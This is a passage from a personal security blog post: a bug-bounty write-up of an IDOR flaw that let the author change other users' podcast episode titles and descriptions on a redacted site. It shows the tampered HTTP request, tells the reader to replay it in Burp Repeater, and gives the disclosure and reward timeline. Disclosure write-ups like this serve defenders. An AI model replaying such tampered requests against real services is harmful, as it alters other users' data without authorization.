&lt;victim id&gt;</b>/metadata HTTP/1.1</i></div><div style="text-align: left;"><i>Host:</i><i>[redacted.com]</i></div><div style="text-align: left;"><i>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</i></div><div style="text-align: left;"><i>Accept: /</i></div><div style="text-align: left;"><i>Accept-Language: en-GB,en;q=0.5</i></div><div style="text-align: left;"><i>Accept-Encoding: gzip, deflate</i></div><div style="text-align: left;"><i>content-type: application/json</i></div><div style="text-align: left;"><i>origin:</i><i>https://</i><i>[redacted.com]</i></div><div style="text-align: left;"><i>Referer: https://[redacted.com]/dashboard/episode/e3mid0/metadata/edit</i></div><div style="text-align: left;"><i>Content-Length: 661</i></div><div style="text-align: left;"><i>Cookie: XXXXXXXXXXXX</i></div><div style="text-align: left;"><i>Connection: close</i></div><div style="text-align: left;"><i><br /></i></div><div style="text-align: left;"><i>{"isDraft":false,"podcastEpisodeIsExplicit":false,"podcastEpisodeType":"full","publishOn":null,"created":"2019-04-09T18:37:20.000Z","description":"&lt;p&gt;test1&lt;/p&gt;","podcastEpisodeNumber":1,"podcastSeasonNumber":1,"safeDescription":"&lt;p&gt;test1&lt;/p&gt;","title":"hacked!","doPublishExternally":true,"episodeAudios":[{"durationHMS":"10s","audioId":"a1ptlh","audioTransformationStatus":null,"caption":"Alley","color":"#fface7","created":"2016-12-02T22:25:38.000Z","doesHaveGeneratedVideo":false,"duration":10443,"key":"a1ptlh-0","sort":0,"userId":null,"url":"</i><i>[redacted.com]</i><i>}</i></div></blockquote><div style="text-align: left;"><i></i></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><i>Repeat the modified request thru repeater in burp and you will get a successful response (200)</i></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Result: <b>Victim's episode title and description can be manipulated or change.</b></div><div><br /></div>
+<br /></div>
+<br />
+<i><b>--Report Timeline--</b></i><br />
+<br />
+<br />
+Title: <i>Changing other REDACTED user's Episode title and description [IDOR]</i><br />
+Reported: <span class="timeline-timestamp spec-timestamp"><i>May 30, 2018</i></span><br /><div><div class="timeline-container-content"><div><div class="markdownable">
+Closed as Informative: <span class="timeline-timestamp" title="April 12, 2019 14:23:08"><i>June 1, 2018</i></span><br />
+<div>
+<div class="timeline-container-content">
+<div>
+<div class="markdownable">
+<blockquote class="tr_bq"><div><div class="timeline-container-content"><div class="markdownable"><p><i>Hello <a href="https://hackerone.com/evanricafort">@evanricafort</a>,</i></p>
+
+<p><i>Thank you for your submission. Unfortunately,&nbsp;</i><i>[redacted.com]</i><i>&nbsp;is currently not in scope. Please feel free to resubmit this bug if it 
+is still valid when the team plans to bring it into the scope of the 
+program.</i></p>
+
+<p><i><a href="https://hackerone.com/xxxxx">@x</a>xxxx</i></p></div></div></div></blockquote>
+</div>
+</div>
+</div>
+</div>
+<div class="markdownable">Re-opened and rewarded: <i>April 24, 2019 ($250)</i></div><div class="markdownable"><br /></div><div class="markdownable">Almost a year after when REDACTED added&nbsp;<i>[redacted.com]</i>&nbsp;on their scope and fortunately all my reports was validated and so this IDOR earned me a bounty of $250. kinda low for this issue because the domain is under their acquisition program but worth the wait since all in all the total bounty for all my reports for&nbsp;<i>[redacted.com]&nbsp;</i>is $1,150.</div><div class="markdownable"><br /></div><br />
+I hope you enjoy this write up. Stay safe and have a great day y'all!<br />
+<br />
+<br />
+<div style="text-align: center;">
+<i><b>"Not how long, but how well you have lived is the main thing." </b><br />&nbsp;Seneca</i></div>
+<br /></div>
+</div>
+</div>
+</div>
+<span class="timeline-timestamp spec-timestamp"></span></div>
+<div style='clear: both;'></div>
+</div>
+<div class='post-footer'>
+<div class='post-footer-line post-footer-line-1'>
+<span class='post-author vcard'>
+Posted by
+<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
+<meta content='https://www.blogger.com/profile/00218829689101601659' itemprop='url'/>
+<a class='g-profile' href='https://www.blogger.com/profile/00218829689101601659' rel='author' title='author profile'>
+<span itemprop='name'>Evan Ricafort</span>
+</a>
+</span>
+</span>
+<span class='post-timestamp'>
+at
+<meta content='http://blog.evanricafort.com/2021/02/idor-in-redacted.html' itemprop='url'/>
+<a class='timestamp-link' href="https://blog.evanricafort.com/2021/02/idor-in-redacted.html" rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2021-02-13T04:01:00+08:00'>04:01</abbr></a>
+</span>
+<span class='post-comment-link'>
+</span>
+<span class='post-icons'>
+<span class='item-control blog-admin pid-851293640'>
+<a href='https://www.blogger.com/post-edit.g?blogID=644826486480529000&postID=455639502551743521&from=pencil' title='Edit Post'>
+<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
+</a>
+</span>
+</span>
+<div class='post-share-buttons goog-inline-block'>
+<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=644826486480529000&postID=455639502551743521&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=644826486480529000&postID=455639502551743521&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=644826486480529000&postID=455639502551743521&target=twitter' target='_blank' title='Share to X'><span class='share-button-link-text'>Share to X</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=644826486480529000&postID=455639502551743521&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=644826486480529000&postID=455639502551743521&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
+</div>
+</div>
+<div class='post-footer-line post-footer-line-2'>
+<span class='post-labels'>
+Labels:
+<a href="https://blog.evanricafort.com/search/label/Blog" rel='tag'>Blog</a>,
+<a href="https://blog.evanricafort.com/search/label/Bug%20Bounty" rel='tag'>Bug Bounty</a>,
+<a href="https://blog.evanricafort.com/search/label/Hacking" rel='tag'>Hacking</a>,
+<a href="https://blog.evanricafort.com/search/label/Infosec" rel='tag'>Infosec</a>,
+<a href="https://blog.evanricafort.com/search/label/Insecure%20Direct%20Object%20Vulnerability" rel='tag'>Insecure Direct Object Vulnerability</a>,
+<a href="https://blog.evanricafort.com/search/label/Open%20Redirect" rel='tag'>Open Redirect</a>,
+<a href="https://blog.evanricafort.com/search/label/Session%20Misconfiguration" rel='tag'>Session Misconfiguration</a>,
+<a href="https://blog.evanricafort.com/search/label/XSS" rel='tag'>XSS</a>
+</span>
+</div>
+<div class='post-footer-line post-footer-line-3'>
+<span class='post-location'>
+Location:
+<a href='https://maps.google.com/maps?q=Philippines@12.879721,121.77401699999996&z=10' target='_blank'>Philippines</a>
+</span>
+</div>
+</div>
+</div>
+<div class='comments' id='comments'>
+<a name='comments'></a>
+<h4>No comments:</h4>
+<div id='Blog1_comments-block-wrapper'>
+<dl class='avatar-comment-indent' id='comments-block'>
+</dl>
+</div>
+<p class='comment-footer'>
+<div class='comment-form'>
+<a name='comment-form'></a>
+<h4 id='comment-post-message'>Post a Comment</h4>
+<p>
+</p>
+<a href='https://www.blogger.com/comment/frame/644826486480529000?po=455639502551743521&hl=en-GB' id='comment-editor-src'></a>
+<iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410px' id='comment-editor' name='comment-editor' src='' width='100%'></iframe>
+<script src='https://www.blogger.com/static/v1/jsbin/2315299244-comment_from_post_iframe.js' type='text/javascript'></script>
+<script type='text/javascript'>
+      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
+    </script>
+</div>
+</p>
+</div>
+</div>
+<div class='inline-ad'>
+</div>
+
+        </div></div>
+      
+</div>
+<div class='blog-pager' id='blog-pager'>
+<span id='blog-pager-newer-link'>
+<a class='blog-pager-newer-link' href="https://blog.evanricafort.com/2021/02/hijacking-reset-password-link-in.html" id='Blog1_blog-pager-newer-link' title='Newer Post'>Newer Post</a>
+</span>
+<span id='blog-pager-older-link'>
+<a class='blog-pager-older-link' href="https://blog.evanricafort.com/2020/12/cve-2019-17674-wordpress-stored-xss.html" id='Blog1_blog-pager-older-link' title='Older Post'>Older Post</a>
+</span>
+<a class='home-link' href="https://blog.evanricafort.com/">Home</a>
+</div>
+<div class='clear'></div>
+<div class='post-feeds'>
+<div class='feed-links'>
+Subscribe to:
+<a class='feed-link' href="https://blog.evanricafort.com/feeds/455639502551743521/comments/default" target='_blank' type='application/atom+xml'>Post Comments (Atom)</a>
+</div>
+</div>
+</div></div>
+</div>
+</div>
+<div class='column-left-outer'>
+<div class='column-left-inner'>
+<aside>
+</aside>
+</div>
+</div>
+<div class='column-right-outer'>
+<div class='column-right-inner'>
+<aside>
+<div class='sidebar section' id='sidebar-right-1'><div class='widget AdSense' data-version='1' id='AdSense1'>
+<div class='widget-content'>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- evanricafort_sidebar-right-1_AdSense1_1x1_as -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5866391232382804"
+     data-ad-host="ca-host-pub-1556223355139109"
+     data-ad-host-channel="L0001"
+     data-ad-slot="3095100978"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<div class='clear'></div>
+</div>
+</div><div class='widget Profile' data-version='1' id='Profile1'>
+<h2>About</h2>
+<div class='widget-content'>
+<a href='https://www.blogger.com/profile/00218829689101601659'><img alt='My photo' class='profile-img' height='80' src='//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXjv49NSKi6u7OAvbbRF5wVAoAsTaBF7PSHXq2me9mKYVx8Z-CcBFL8ctKWfZK88uWbsnKj_IMekcqi5nSMblL7F-tmMUXX3xPFGPnhv41xQOZYDINipE46iJoXwPtqQ/s112/profile.png' width='79'/></a>
+<dl class='profile-datablock'>
+<dt class='profile-data'>
+<a class='profile-name-link g-profile' href='https://www.blogger.com/profile/00218829689101601659' rel='author' style='background-image: url(//www.blogger.com/img/logo-16.png);'>
+Evan Ricafort
+</a>
+</dt>
+<dd class='profile-textblock'>This blog contains write-ups of some of my findings.</dd>
+</dl>
+<a class='profile-link' href='https://www.blogger.com/profile/00218829689101601659' rel='author'>View my complete profile</a>
+<div class='clear'></div>
+</div>
+</div><div class='widget HTML' data-version='1' id='HTML1'>
+<h2 class='title'>My Twitter Feeds</h2>
+<div class='widget-content'>
+<a class="twitter-timeline" data-height="400" data-theme="dark" href="https://twitter.com/evanricafort?ref_src=twsrc%5Etfw">Tweets by evanricafort</a> <script async="async" src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script>
+</div>
+<div class='clear'></div>
+</div><div class='widget Stats' data-version='1' id='Stats1'>
+<h2>Total Pageviews</h2>
+<div class='widget-content'>
+<div id='Stats1_content' style='display: none;'>
+<script src='https://www.gstatic.com/charts/loader.js' type='text/javascript'></script>
+<span id='Stats1_sparklinespan' style='display:inline-block; width:75px; height:30px'></span>
+<span class='counter-wrapper text-counter-wrapper' id='Stats1_totalCount'>
+</span>
+<div class='clear'></div>
+</div>
+</div>
+</div></div>
+<table border='0' cellpadding='0' cellspacing='0' class='section-columns columns-2'>
+<tbody>
+<tr>
+<td class='first columns-cell'>
+<div class='sidebar section' id='sidebar-right-2-1'><div class='widget BlogArchive' data-version='1' id='BlogArchive1'>
+<h2>Blog Archive</h2>
+<div class='widget-content'>
+<div id='ArchiveList'>
+<div id='BlogArchive1_ArchiveList'>
+<ul class='flat'>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2023/05/">May</a> (2)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2021/06/">June</a> (3)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2021/05/">May</a> (1)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2021/02/">February</a> (2)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2020/12/">December</a> (1)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2020/04/">April</a> (1)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2020/02/">February</a> (2)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2019/12/">December</a> (2)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2019/08/">August</a> (3)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2019/07/">July</a> (2)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2018/08/">August</a> (1)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2018/02/">February</a> (1)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2016/12/">December</a> (1)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2016/09/">September</a> (1)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2016/06/">June</a> (1)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2016/05/">May</a> (1)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2016/04/">April</a> (1)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2016/03/">March</a> (1)
+      </li>
+<li class='archivedate'>
+<a href="https://blog.evanricafort.com/2015/12/">December</a> (4)
+      </li>
+</ul>
+</div>
+</div>
+<div class='clear'></div>
+</div>
+</div></div>
+</td>
+<td class='columns-cell'>
+<div class='sidebar section' id='sidebar-right-2-2'><div class='widget Label' data-version='1' id='Label1'>
+<h2>Labels</h2>
+<div class='widget-content cloud-label-widget-content'>
+<span class='label-size label-size-5'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Security">Security</a>
+</span>
+<span class='label-size label-size-5'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Vulnerability">Vulnerability</a>
+</span>
+<span class='label-size label-size-5'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Bug%20Bounty">Bug Bounty</a>
+</span>
+<span class='label-size label-size-5'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Infosec">Infosec</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Hacking">Hacking</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Blog">Blog</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/XSS">XSS</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Broken%20Authentication">Broken Authentication</a>
+</span>
+<span class='label-size label-size-3'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Session%20Misconfiguration">Session Misconfiguration</a>
+</span>
+<span class='label-size label-size-3'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Information%20Disclosure">Information Disclosure</a>
+</span>
+<span class='label-size label-size-3'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Wordpress">Wordpress</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Browser">Browser</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Business%20Logic">Business Logic</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/HTML%20Injection">HTML Injection</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Insecure%20Direct%20Object%20Vulnerability">Insecure Direct Object Vulnerability</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Bypass">Bypass</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Cydia">Cydia</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Google">Google</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Race%20Condition">Race Condition</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/SSRF">SSRF</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Stored%20XSS">Stored XSS</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Story">Story</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Tutorial">Tutorial</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/iOS">iOS</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/2016">2016</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/2FA%20Verification%20Bypass%0AShapeshift">2FA Verification Bypass
+Shapeshift</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Application">Application</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Arbitary%20File%20Upload">Arbitary File Upload</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Blind-XSS">Blind-XSS</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/CVE-2019-17674">CVE-2019-17674</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Comodo%20Dragon">Comodo Dragon</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Cydia%20iOS">Cydia iOS</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/DNS">DNS</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/DNS%20Takeover">DNS Takeover</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Dapitan%20City">Dapitan City</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Denial%20of%20Service">Denial of Service</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/DoS">DoS</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Documentation">Documentation</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Facebook">Facebook</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Google%20Chrome">Google Chrome</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Google%20FRP%20Bypass">Google FRP Bypass</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Google%20VRP">Google VRP</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Host%20Header%20Hijacking">Host Header Hijacking</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Host%20Header%20Poisoning">Host Header Poisoning</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Huawei">Huawei</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Huawei%20Y9%20Prime%202019">Huawei Y9 Prime 2019</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/IPv6">IPv6</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Install%20Cydia">Install Cydia</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Jailbreak">Jailbreak</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Journey">Journey</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Latest%20EMUI">Latest EMUI</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Life">Life</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Local%20File%20XSS">Local File XSS</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Logical">Logical</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Nest">Nest</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Network">Network</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Open%20Redirect">Open Redirect</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Pentesting">Pentesting</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Philippines">Philippines</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/RCE">RCE</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Remote%20Code%20Execution">Remote Code Execution</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Removed%20Cydia">Removed Cydia</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Tongbu">Tongbu</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Travel">Travel</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Twitter">Twitter</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/UXSS">UXSS</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Vacation">Vacation</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/Year%20in%20Review">Year in Review</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href="https://blog.evanricafort.com/search/label/mitm6">mitm6</a>
+</span>
+<div class='clear'></div>
+</div>
+</div></div>
+</td>
+</tr>
+</tbody>
+</table>
+<div class='sidebar no-items section' id='sidebar-right-3'></div>
+</aside>
+</div>
+</div>
+</div>
+<div style='clear: both'></div>
+<!-- columns -->
+</div>
+<!-- main -->
+</div>
+</div>
+<div class='main-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<footer>
+<div class='footer-outer'>
+<div class='footer-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left footer-fauxborder-left'>
+<div class='fauxborder-right footer-fauxborder-right'></div>
+<div class='region-inner footer-inner'>
+<div class='foot no-items section' id='footer-1'></div>
+<table border='0' cellpadding='0' cellspacing='0' class='section-columns columns-2'>
+<tbody>
+<tr>
+<td class='first columns-cell'>
+<div class='foot no-items section' id='footer-2-1'></div>
+</td>
+<td class='columns-cell'>
+<div class='foot no-items section' id='footer-2-2'></div>
+</td>
+</tr>
+</tbody>
+</table>
+<!-- outside of the include in order to lock Attribution widget -->
+<div class='foot section' id='footer-3' name='Footer'><div class='widget Attribution' data-version='1' id='Attribution1'>
+<div class='widget-content' style='text-align: center;'>
+Awesome Inc. theme. Powered by <a href='https://www.blogger.com' target='_blank'>Blogger</a>.
+</div>
+<div class='clear'></div>
+</div></div>
+</div>
+</div>
+<div class='footer-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</footer>
+<!-- content -->
+</div>
+</div>
+<div class='content-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</div>
+<script type='text/javascript'>
+    window.setTimeout(function() {
+        document.body.className = document.body.className.replace('loading', '');
+      }, 10);
+  </script>
+
+<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/91768132-widgets.js"></script>
+<script type='text/javascript'>
+window['__wavt'] = 'AOuZoY6KcToqsKaIVURoQ-3Lh6F4kIc76g:1736581030671';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d644826486480529000','//blog.evanricafort.com/2021/02/idor-in-redacted.html','644826486480529000');
+_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '644826486480529000', 'title': 'Evan Ricafort | Blog', 'url': 'http://blog.evanricafort.com/2021/02/idor-in-redacted.html', 'canonicalUrl': 'http://blog.evanricafort.com/2021/02/idor-in-redacted.html', 'homepageUrl': 'http://blog.evanricafort.com/', 'searchUrl': 'http://blog.evanricafort.com/search', 'canonicalHomepageUrl': 'http://blog.evanricafort.com/', 'blogspotFaviconUrl': 'http://blog.evanricafort.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': false, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en-GB', 'localeUnderscoreDelimited': 'en_gb', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Evan Ricafort | Blog - Atom\x22 href\x3d\x22http://blog.evanricafort.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Evan Ricafort | Blog - RSS\x22 href\x3d\x22http://blog.evanricafort.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Evan Ricafort | Blog - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/644826486480529000/posts/default\x22 /\x3e\n\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Evan Ricafort | Blog - Atom\x22 href\x3d\x22http://blog.evanricafort.com/feeds/455639502551743521/comments/default\x22 /\x3e\n', 'meTag': '', 'adsenseClientId': 'ca-pub-5866391232382804', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': true, 'adsenseAutoAds': false, 'boqCommentIframeForm': true, 'loginRedirectParam': '', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/d2c988fc3a56b1b1', 'plusOneApiSrc': 'https://apis.google.com/js/platform.js', 'disableGComments': true, 'interstitialAccepted': false, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'X', 'key': 'twitter', 'shareMessage': 'Share to X', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en_GB\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'item', 'postId': '455639502551743521', 'pageName': 'Changing other users Episode title \x26 description - IDOR Vulnerability in [REDACTED] (Write Up)', 'pageTitle': 'Evan Ricafort | Blog: Changing other users Episode title \x26 description - IDOR Vulnerability in [REDACTED] (Write Up)', 'metaDescription': 'Bug Bounty, XSS, Infosec, Hacking, Insecure Direct Object Vulnerability, Session Misconfiguration, Open Redirect, Spotify, Anchor FM'}}, {'name': 'features', 'data': {}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard', 'ok': 'Ok', 'postLink': 'Post link'}}, {'name': 'template', 'data': {'name': 'Awesome Inc.', 'localizedName': 'Awesome Inc.', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': false, 'variant': 'dark', 'variantId': 'dark'}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': 